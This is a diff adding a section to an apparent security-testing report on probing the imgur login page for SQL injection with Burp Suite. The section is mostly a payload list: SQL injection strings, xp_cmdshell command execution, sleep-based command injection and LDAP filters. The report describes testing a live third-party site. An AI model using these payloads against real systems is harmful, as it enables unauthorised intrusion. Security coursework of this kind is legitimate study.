@@ -482,6 +482,139 @@ it is not recommended to perform extended UNION tests if there is not at least o
 - Other forms and appliacations at imgur are not suitable for SQLmap tests, because they're not using url querries or there are some additional securities like reCAPTCHA.
 ![imgur login form reCAPTCHA](https://i.imgur.com/DrF4k0j.png)
 
+#### Exploitation - Burpsuite & SQLi
+- Burpsuite can be also used to test SQLi vulnerability. 
+- Because the imgur search bar did not seem injectable, we'll test the imgur login page for SQLi.
+
+- SQLi list of payloads tested
+```sql
+'
+"
+#
+-
+--
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+0 OR 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' OR 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" OR 1=1--
+' or '1'='1'--
+"' OR 1 --'"
+OR 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') OR ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' OR 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' OR 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+SELECT
+INSERT
+AS
+OR
+PROCEDURE
+LIMIT
+ORDER BY
+ASC
+DESC
+DELETE
+UPDATE
+DISTINCT
+HAVING
+TRUNCATE
+REPLACE
+LIKE
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+EXEC xp
+EXEC sp
+'; exec master..xp_cmdshell
+'; EXEC xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' OR (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' OR 1=1 OR ''='
+' OR ''='
+x' OR 1=1 OR 'x'='y
+/
+//
+//*
+*/*
+```
+
 ### References
 - [1] Command Injection - OWASP. Command Injection - OWASP [online]. Texas, USA: OWASP Foundation, 2018 [quoted. 2019-04-13]. Availiable from: https://www.owasp.org/index.php/Command_Injection
 - [2] DVWA - Damn Vulnerable Web Application [online]. UK: DVWA, 2019 [quoted. 2019-04-13]. Availiable from: http://www.dvwa.co.uk/
